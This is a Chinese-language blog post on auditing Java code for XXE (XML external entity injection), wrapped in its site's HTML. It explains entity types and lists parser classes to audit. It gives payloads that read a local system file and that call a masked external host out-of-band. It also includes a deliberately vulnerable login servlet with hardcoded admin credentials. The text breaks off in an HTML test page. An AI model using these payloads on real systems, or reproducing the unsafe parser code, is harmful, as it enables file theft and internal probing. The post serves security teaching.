@@ -1,0 +1,1452 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-center-atom.min.css?v=1.0.2">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.0.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.0.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.0.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.0.1',
+    sidebar: {"position":"left","display":"always","offset":12,"onmobile":true,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="XXEXXE漏洞简介XXE（XML外部实体注入，XML外部实体），在应用程序解析XML输入时，允许引用外部实体时，可构造恶意内容，导致读取任意文件，探测内网端口，攻击内网网站，发起DoS拒绝服务攻击，执行系统命令等.Java中的XXE支持sun.net.www.protocol 里的所有协议：http，https，文件，ftp，mailto，jar，netdoc。一般利用文件协议读取文件，利用ht">
+<meta name="keywords" content="XXE,代码审计,Java">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java代码审计-XXE">
+<meta property="og:url" content="https://my0tang.github.io/2019/04/21/Java代码审计-XXE/index.html">
+<meta property="og:site_name" content="My0Tang">
+<meta property="og:description" content="XXEXXE漏洞简介XXE（XML外部实体注入，XML外部实体），在应用程序解析XML输入时，允许引用外部实体时，可构造恶意内容，导致读取任意文件，探测内网端口，攻击内网网站，发起DoS拒绝服务攻击，执行系统命令等.Java中的XXE支持sun.net.www.protocol 里的所有协议：http，https，文件，ftp，mailto，jar，netdoc。一般利用文件协议读取文件，利用ht">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-04-21T14:05:13.507Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Java代码审计-XXE">
+<meta name="twitter:description" content="XXEXXE漏洞简介XXE（XML外部实体注入，XML外部实体），在应用程序解析XML输入时，允许引用外部实体时，可构造恶意内容，导致读取任意文件，探测内网端口，攻击内网网站，发起DoS拒绝服务攻击，执行系统命令等.Java中的XXE支持sun.net.www.protocol 里的所有协议：http，https，文件，ftp，mailto，jar，netdoc。一般利用文件协议读取文件，利用ht">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="My0Tang" type="application/atom+xml">
+
+
+
+  
+  
+  <link rel="canonical" href="https://my0tang.github.io/2019/04/21/Java代码审计-XXE/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Java代码审计-XXE | My0Tang</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://github.com/My0Tang" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">My0Tang</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">网络安全爱好者</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-jilu">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/jilu/" rel="section"><i class="menu-item-icon fa fa-fw fa-bookmark"></i> <br>记录</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://my0tang.github.io/2019/04/21/Java代码审计-XXE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="My0Tang">
+      <meta itemprop="description" content="Technology - never stop">
+      <meta itemprop="image" content="/images/tx.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="My0Tang">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Java代码审计-XXE
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o">TEST</i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-04-21 13:44:00 / 修改时间：14:05:13" itemprop="dateCreated datePublished" datetime="2019-04-21T13:44:00+00:00">2019-04-21</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/代码审计/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">评论数：</span>
+                <a href="/2019/04/21/Java代码审计-XXE/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/04/21/Java代码审计-XXE/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+            <div class="post-symbolscount">
+			
+				
+					<span id="/2019/04/21/Java代码审计-XXE/" class="leancloud_visitors" data-flag-title="Java代码审计-XXE">
+						<span class="post-meta-item-icon">
+							<i class="fa fa-eye"></i>
+						</span>
+				
+                <span class="post-meta-item-text">热度：</span>
+              
+                <span class="leancloud-visitors-count"></span>
+				<span>℃</span>
+				<span class="post-meta-divider">|</span>
+            </span>
+          
+
+          
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">13k 字</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">12 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="XXE漏洞简介"><a href="#XXE漏洞简介" class="headerlink" title="XXE漏洞简介"></a>XXE漏洞简介</h2><p>XXE（XML外部实体注入，XML外部实体），在应用程序解析XML输入时，允许引用外部实体时，可构造恶意内容，导致读取任意文件，探测内网端口，攻击内网网站，发起DoS拒绝服务攻击，执行系统命令等.Java中的XXE支持sun.net.<a href="http://www.protocol" target="_blank" rel="noopener">www.protocol</a> 里的所有协议：http，https，文件，ftp，mailto，jar，netdoc。一般利用文件协议读取文件，利用http协议探测内网，没有回显时可组合利用文件协议和FTP协议来读取文件。</p>
+<h2 id="XXE相关基础概念"><a href="#XXE相关基础概念" class="headerlink" title="XXE相关基础概念"></a>XXE相关基础概念</h2><p>XML（可扩展标记语言，可扩展标记语言），是一种标记语言，用来传输和存储数据，而非显示数据.DTD<br>（文档类型定义，文档类型定义）的作用是定义XML文档的合法构建模块。它使用一系列的合法元素来定义文档结构。</p>
+<p>实体实体<br>XML中的实体类型，一般有下面几种：字符实体，命名实体（或内部实体），外部普通实体，外部参数实体除外部参数实体外，其它实体都以字符（＆）开始，以字符（ ;）结束。</p>
+<p>1）字符实体<br>字符实体类似的html中的实体编码，形如：一（十进制）或者一（十六进制）。</p>
+<p>2）命名实体（内部实体）<br>内部实体又称为命名实体命名实体可以说成是变量声明，命名实体只能声明在DTD或者XML文件开始部分（的&lt;！DOCTYPE&gt;语句中）。<br>命名实体（或内部实体）语法：<br><code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code><br>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">    &lt;!ENTITY x &quot;First Param!&quot;&gt;</span><br><span class="line">    &lt;!ENTITY y &quot;Second Param!&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;x&gt;&amp;x;&lt;/x&gt;&lt;y&gt;&amp;y;&lt;/y&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure></p>
+<p>定义一个实体名称x值为First Param！<br>＆X; 引用实体X</p>
+<p>3）外部普通实体<br>外部实体用于加载外部文件的内容（显式XXE攻击主要利用外部普通实体）。<br>外部普通实体语法：<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</code></p>
+<p>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPe root [</span><br><span class="line">    &lt;!ENTITY outfile SYSTEM &quot;outfile.xml&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;outfile&gt;&amp;outfile;&lt;/outfile&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure></p>
+<p>4）外部参数实体<br>参数实体用于DTD和文档的内部子集中与一般实体不同，是以字符（％）开始，以字符。（;）。。结束只有在DTD文件中才能在参数实体声明的时候引用其他实体（盲XXE攻击常利用参数实体进行数据回显）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">    &lt;!ENTITY % param1 &quot;Hello&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % param2 &quot; &quot;&gt;</span><br><span class="line">    &lt;!ENTITY % param3 &quot;World&quot;&gt;</span><br><span class="line">    &lt;!ENTITY dtd SYSTEM &quot;combine.dtd&quot;&gt;</span><br><span class="line">    %dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;foo&gt;&amp;content&lt;/foo&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure></p>
+<p>combine.dtd中的内容为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY content &quot;%param1;%param2;%param3;&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<h2 id="XXE审计函数"><a href="#XXE审计函数" class="headerlink" title="XXE审计函数"></a>XXE审计函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line">javax.xml.parsers.SAXParser</span><br><span class="line">javax.xml.transform.TransformerFactory</span><br><span class="line">javax.xml.validation.Validator</span><br><span class="line">javax.xml.validation.SchemaFactory</span><br><span class="line">javax.xml.transform.sax.SAXTransformerFactory</span><br><span class="line">javax.xml.transform.sax.SAXSource</span><br><span class="line">org.xml.sax.XMLReader</span><br><span class="line">org.xml.sax.helpers.XMLReaderFactory</span><br><span class="line">org.dom4j.io.SAXReader</span><br><span class="line">org.jdom.input.SAXBuilder</span><br><span class="line">org.jdom2.input.SAXBuilder</span><br><span class="line">javax.xml.bind.Unmarshaller</span><br><span class="line">javax.xml.xpath.XpathExpression</span><br><span class="line">javax.xml.stream.XMLStreamReader</span><br><span class="line">org.apache.commons.digester3.Digester</span><br><span class="line">…………</span><br></pre></td></tr></table></figure>
+<h2 id="常用测试POC"><a href="#常用测试POC" class="headerlink" title="常用测试POC"></a>常用测试POC</h2><h3 id="POC1-外部普通实体"><a href="#POC1-外部普通实体" class="headerlink" title="POC1-外部普通实体"></a>POC1-外部普通实体</h3><p>当有回显时，利用File协议来读取文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lltest[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt;</span><br><span class="line">]&gt; </span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="POC2-外部参数实体"><a href="#POC2-外部参数实体" class="headerlink" title="POC2-外部参数实体"></a>POC2-外部参数实体</h3><p>无回显时利用http协议来发起请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note[ </span><br><span class="line">&lt;!ENTITY % lltest SYSTEM &quot;http://***.***.***.***:7777/lltest_xxe666&quot;&gt;</span><br><span class="line">%lltest;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></p>
+<h2 id="XXE漏洞代码示例"><a href="#XXE漏洞代码示例" class="headerlink" title="XXE漏洞代码示例"></a>XXE漏洞代码示例</h2><h3 id="Dom读取XML"><a href="#Dom读取XML" class="headerlink" title="Dom读取XML"></a>Dom读取XML</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">package com.servlet;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">import javax.servlet.ServletException;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.HttpServlet;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import org.w3c.dom.Document;</span><br><span class="line">import org.w3c.dom.NodeList;</span><br><span class="line">import org.xml.sax.SAXException;</span><br><span class="line"></span><br><span class="line">import javax.xml.parsers.*;</span><br><span class="line"></span><br><span class="line">@WebServlet(&quot;/xxe/doLogin1&quot;)</span><br><span class="line">public class LoginServlet1 extends HttpServlet &#123;</span><br><span class="line">	private static final long serialVersionUID = 1L;</span><br><span class="line">	</span><br><span class="line">	private static final String USERNAME = &quot;admin&quot;;</span><br><span class="line">	private static final String PASSWORD = &quot;admin&quot;;</span><br><span class="line">	</span><br><span class="line">	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;		</span><br><span class="line">		</span><br><span class="line">        String result=&quot;&quot;;</span><br><span class="line">		try &#123;</span><br><span class="line">			//DOM Read XML</span><br><span class="line">			DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();     </span><br><span class="line">	        DocumentBuilder db = dbf.newDocumentBuilder();					</span><br><span class="line">			Document doc = db.parse(request.getInputStream());</span><br><span class="line">			</span><br><span class="line">			String username = getValueByTagName(doc,&quot;username&quot;);</span><br><span class="line">			String password = getValueByTagName(doc,&quot;password&quot;);</span><br><span class="line">			if(username.equals(USERNAME) &amp;&amp; password.equals(PASSWORD))&#123;</span><br><span class="line">				result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,username);</span><br><span class="line">			&#125;else&#123;</span><br><span class="line">				result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,username);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; catch (ParserConfigurationException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">			result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,e.getMessage());</span><br><span class="line">		&#125; catch (SAXException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">			result = String.format(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,e.getMessage());</span><br><span class="line">		&#125;</span><br><span class="line">		response.setContentType(&quot;text/xml;charset=UTF-8&quot;);</span><br><span class="line">		response.getWriter().append(result);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;</span><br><span class="line">		doPost(request, response);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public static String getValueByTagName(Document doc, String tagName)&#123;  </span><br><span class="line">        if(doc == null || tagName.equals(null))&#123;  </span><br><span class="line">            return &quot;&quot;;  </span><br><span class="line">        &#125;  </span><br><span class="line">        NodeList pl = doc.getElementsByTagName(tagName);  </span><br><span class="line">        if(pl != null &amp;&amp; pl.getLength() &gt; 0)&#123;  </span><br><span class="line">            return pl.item(0).getTextContent();  </span><br><span class="line">        &#125; </span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>html参考<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">	&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot; /&gt;</span><br><span class="line"></span><br><span class="line">	&lt;title&gt;XXE-test&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">	&lt;meta content=&apos;width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0&apos; name=&apos;viewport&apos; 